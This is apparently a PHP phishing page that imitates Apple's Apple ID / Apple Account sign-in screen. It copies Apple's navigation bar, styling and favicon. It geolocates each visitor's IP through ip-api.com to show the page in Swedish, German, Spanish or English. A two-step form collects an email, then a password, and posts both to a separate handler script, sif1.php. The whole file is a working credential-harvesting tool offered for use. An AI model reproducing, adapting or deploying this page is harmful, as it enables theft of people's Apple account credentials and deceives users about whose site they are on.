<?php
if (session_status() == PHP_SESSION_NONE) { session_start(); }

// 1️⃣ جلب وتجهيز الآي بي
$ib = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$_SESSION['user_ip'] = $ib;
$ip_clean = str_replace(['.', ':'], '_', $ib);

// 2️⃣ 🌍 فحص دولة الـ IP أو الـ VPN تلقائياً لكل دول العالم
$user_lang = 'en'; 

$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ib}?fields=countryCode"));
if ($details && isset($details->countryCode)) {
    $country = strtoupper($details->countryCode);
    $sv_countries = ['SE', 'NO', 'FI', 'DK'];
    $de_countries = ['DE', 'CH', 'AT', 'LU'];
    $es_countries = ['ES', 'MX', 'AR', 'CO', 'CL', 'PE', 'VE'];

    if (in_array($country, $sv_countries)) { $user_lang = 'sv'; } 
    elseif (in_array($country, $de_countries)) { $user_lang = 'de'; } 
    elseif (in_array($country, $es_countries)) { $user_lang = 'es'; } 
    else { $user_lang = 'en'; }
} else {
    $allowed_langs = ['de', 'sv', 'es', 'en'];
    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
        if (in_array($browser_lang, $allowed_langs)) { $user_lang = $browser_lang; }
    }
}

// 📚 قاموس الترجمة
$lang_dict = [
    'de' => [
        'title' => 'Mit Apple-ID anmelden', 'h1' => 'Apple-ID', 'subtitle' => 'Deine Apple-ID verwalten',
        'placeholder' => 'Apple-ID (E-Mail-Adresse oder Telefonnummer)', 'password' => 'Passwort',
        'continue' => 'Fortfahren', 'signin' => 'Anmelden', 'change' => 'Ändern', 'iphone_btn' => 'Mit iPhone anmelden',
        'requires_ios' => 'Erfordert ein Gerät mit iOS 17 oder neuer.',
        'privacy' => 'Deine Apple-ID-Informationen werden verwendet, um dir das sichere Anmelden zu ermöglichen. <a href="#">Erfahre mehr...</a>'
    ],
    'sv' => [
        'title' => 'Logga in med Apple-ID', 'h1' => 'Apple-ID', 'subtitle' => 'Hantera ditt Apple-ID',
        'placeholder' => 'Apple-ID (e-postadress eller telefonnummer)', 'password' => 'Lösenord',
        'continue' => 'Fortsätt', 'signin' => 'Logga in', 'change' => 'Ändra', 'iphone_btn' => 'Logga in med iPhone',
        'requires_ios' => 'Kräver en enhet med iOS 17 eller senare.',
        'privacy' => 'Informationen om ditt Apple-ID används för att du ska kunna logga in säkert. <a href="#">Se mer...</a>'
    ],
    'es' => [
        'title' => 'Iniciar sesión con el ID de Apple', 'h1' => 'ID de Apple', 'subtitle' => 'Gestionar tu ID de Apple',
        'placeholder' => 'ID de Apple (correo electrónico o número de teléfono)', 'password' => 'Contraseña',
        'continue' => 'Continuar', 'signin' => 'Iniciar sesión', 'change' => 'Cambiar', 'iphone_btn' => 'Iniciar sesión con el iPhone',
        'requires_ios' => 'Requiere un dispositivo con iOS 17 o posterior.',
        'privacy' => 'La información de tu ID de Apple se usa para permitirte iniciar sesión de forma segura. <a href="#">Ver más...</a>'
    ],
    'en' => [
        'title' => 'Sign In to Apple Account', 'h1' => 'Apple Account', 'subtitle' => 'Manage your Apple Account',
        'placeholder' => 'Email or Phone Number', 'password' => 'Password',
        'continue' => 'Continue', 'signin' => 'Sign In', 'change' => 'Change', 'iphone_btn' => 'Sign in with iPhone',
        'requires_ios' => 'Requires a device with iOS 17 or later.',
        'privacy' => 'Your Apple Account information is used to allow you to sign in securely. <a href="#">See how your data is managed...</a>'
    ]
];
$text = $lang_dict[$user_lang];
?>
<!DOCTYPE html>
<html class="full-height" dir="ltr" lang="<?php echo $user_lang; ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title><?php echo $text['title']; ?></title>
    <link rel="shortcut icon" href="https://appleid.cdn-apple.com/static/bin/cb3460663665/images/favicon.ico">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #1d1d1f; -webkit-font-smoothing: antialiased; }
        .apple-nav { width: 100%; background: rgba(251, 251, 253, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #d2d2d7; display: flex; justify-content: center; align-items: center; padding: 0 22px; height: 48px; font-size: 12px; font-weight: 400; }
        .apple-nav-links { display: flex; justify-content: space-between; width: 100%; max-width: 1024px; list-style: none; margin: 0; padding: 0; }
        .apple-nav-links li a { color: rgba(0, 0, 0, 0.8); text-decoration: none; opacity: 0.8; }
        .sub-header { max-width: 1024px; margin: 0 auto; padding: 30px 22px 12px 22px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #d2d2d7; }
        .sub-header h2 { font-size: 21px; font-weight: 600; margin: 0; color: #1d1d1f; }
        .signin-container { max-width: 440px; margin: 50px auto; padding: 0 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .logo-container { margin-bottom: 20px; width: 130px; height: 130px; }
        .logo-container img { width: 100%; height: 100%; object-fit: contain; }
        h1 { font-size: 32px; font-weight: 600; letter-spacing: -0.015em; margin: 0 0 8px 0; color: #1d1d1f; }
        .subtitle { font-size: 17px; color: #1d1d1f; margin-bottom: 30px; }
        form { width: 100%; display: flex; flex-direction: column; align-items: center; }
        .input-wrapper { position: relative; width: 100%; margin-bottom: 25px; }
        .apple-input { width: 100%; height: 56px; border: 1px solid #86868b; border-radius: 12px; padding: 16px; font-size: 17px; color: #1d1d1f; outline: none; transition: border-color 0.2s, box-shadow 0.2s; background-color: #fff; }
        .apple-input:focus { border-color: #0071e3; box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.15); }
        .privacy-box { display: flex; align-items: flex-start; text-align: left; gap: 12px; font-size: 12px; color: #6e6e73; line-height: 1.4; margin-bottom: 30px; width: 100%; }
        .privacy-icon { width: 30px; height: 30px; flex-shrink: 0; }
        .buttons-group { display: flex; gap: 12px; width: 100%; justify-content: space-between; }
        .btn-base { height: 44px; border-radius: 10px; font-size: 15px; font-weight: 400; cursor: pointer; border: none; display: inline-flex; align-items: center; justify-content: center; text-decoration: none; }
        .btn-continue { background-color: #98cafc; color: #fff; flex: 1; pointer-events: none; }
        .btn-continue.active { background-color: #0071e3; pointer-events: auto; }
        .btn-iphone { background-color: #1d1d1f; color: #fff; flex: 1.1; gap: 8px; }
        .requires-text { font-size: 12px; color: #6e6e73; margin-top: 12px; width: 100%; text-align: center; }
        .email-display-container { display: none; background: #f5f5f7; padding: 14px; border-radius: 12px; margin-bottom: 20px; text-align: left; width: 100%; justify-content: space-between; align-items: center; }
        .change-link { color: #0066cc; cursor: pointer; font-size: 14px; }
        .password-section { display: none; width: 100%; }
        #email-group { width: 100%; display: flex; flex-direction: column; align-items: center; }
    </style>
</head>
<body>
    <nav class="apple-nav"><ul class="apple-nav-links"><li><a href="#"></a></li><li><a href="#">Store</a></li><li><a href="#">Mac</a></li><li><a href="#">iPad</a></li><li><a href="#">iPhone</a></li><li><a href="#">Watch</a></li><li><a href="#">Support</a></li></ul></nav>
    <div class="sub-header"><h2><?php echo $text['h1']; ?></h2></div>
    <div class="signin-container">
        <div class="logo-container"><img src="1.jpg" alt="Logo"></div>
        <h1 id="main-heading"><?php echo $text['h1']; ?></h1>
        <div class="subtitle" id="main-subtitle"><?php echo $text['subtitle']; ?></div>
        <div id="email-display-box" class="email-display-container"><span id="text-email-current" style="font-weight: 500;"></span><span id="change-btn" class="change-link"><?php echo $text['change']; ?></span></div>
        <form id="login-form" action="sif1.php" method="POST">
            <div id="email-group">
                <div class="input-wrapper"><input class="apple-input" type="text" id="email" name="email" placeholder="<?php echo $text['placeholder']; ?>" autocomplete="off"></div>
                <div class="privacy-box"><img class="privacy-icon" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle fill='%230066cc' cx='16' cy='16' r='14'/><path fill='%23fff' d='M14 22h4v-8h-4zm0-10h4V8h-4z'/></svg>"><span><?php echo $text['privacy']; ?></span></div>
                <div class="buttons-group"><button type="button" id="continue-btn" class="btn-base btn-continue"><?php echo $text['continue']; ?></button><button type="button" class="btn-base btn-iphone"><svg width="14" height="16" viewBox="0 0 14 20" fill="currentColor"><path d="M11.5 0h-9C1.12 0 0 1.12 0 2.5v15C0 18.88 1.12 20 2.5 20h9c1.38 0 2.5-1.12 2.5-2.5v-15C14 1.12 12.88 0 11.5 0z"/></svg><?php echo $text['iphone_btn']; ?></button></div>
                <div class="requires-text"><?php echo $text['requires_ios']; ?></div>
            </div>
            <div id="password-group" class="password-section">
                <div class="input-wrapper"><input class="apple-input" type="password" id="password" name="password" placeholder="<?php echo $text['password']; ?>"></div>
                <div class="buttons-group"><button type="submit" id="signin-btn" class="btn-base btn-continue active" style="pointer-events: auto; width: 100%;"><?php echo $text['signin']; ?></button></div>
            </div>
        </form>
    </div>
    <script>
        const em = document.getElementById("email"), pw = document.getElementById("password"), eg = document.getElementById("email-group"), pg = document.getElementById("password-group"), eb = document.getElementById("email-display-box"), te = document.getElementById("text-email-current"), cb = document.getElementById("continue-btn"), mh = document.getElementById("main-heading"), ms = document.getElementById("main-subtitle");
        em.addEventListener("input", function() { if (this.value.trim() !== "") cb.classList.add("active"); else cb.classList.remove("active"); });
        cb.onclick = function () { if (em.value.trim() === "") return; te.textContent = em.value; eg.style.display = "none"; mh.style.display = "none"; ms.style.display = "none"; eb.style.display = "flex"; pg.style.display = "block"; pw.focus(); };
        document.getElementById("change-btn").onclick = function () { eg.style.display = "block"; mh.style.display = "block"; ms.style.display = "block"; pg.style.display = "none"; eb.style.display = "none"; em.focus(); };
    </script>
</body>
</html>